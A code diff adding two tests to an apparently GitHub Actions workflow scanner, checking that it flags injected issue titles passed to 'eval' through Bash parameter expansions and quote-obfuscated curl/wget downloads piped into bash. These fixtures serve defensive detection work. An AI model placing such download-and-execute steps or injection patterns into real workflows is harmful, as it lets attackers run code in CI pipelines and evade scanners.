@@ -397,3 +397,25 @@ test('Codex P1: escaped downloader spellings cannot hide a remote pipe from AST'
   assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify({downloader,actual}));
  }
 });
+
+test('Codex P1: Bash parameter expansions of tainted env never escape auditing',()=>{
+ const expansions=['${CMD:-safe}','${CMD-safe}','${CMD:=safe}','${CMD:+safe}',
+  '${CMD:0:3}','${!CMD}'];
+ for(const word of expansions){
+  const yaml=['on: issues','env:','  CMD: ${{ github.event.issue.title }}',
+   'jobs:','  audit:','    steps:','      - run: eval '+word].join('\n');
+  const actual=inspectWorkflow(yaml);
+  assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify({word,actual}));
+  assert.ok(actual.findings.some(f=>f.severity==='BLOCKER')||actual.coverage.partial,JSON.stringify({word,actual}));
+ }
+});
+test('Codex P1: shell concatenated quoted downloader names never certify clean',()=>{
+ const downloaders=["c''url",'"c"url',"c'u'rl","w''get",'"w"get'];
+ for(const downloader of downloaders){
+  const yaml=['on: push','jobs:','  audit:','    steps:',
+   '      - run: '+downloader+' https://example.invalid/script | bash'].join('\n');
+  const result=inspectWorkflow(yaml);
+  assert.notEqual(result.status,'NO_RISK_PATTERN',JSON.stringify({downloader,result}));
+  assert.ok(result.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE')||result.coverage.partial,JSON.stringify({downloader,result}));
+ }
+});
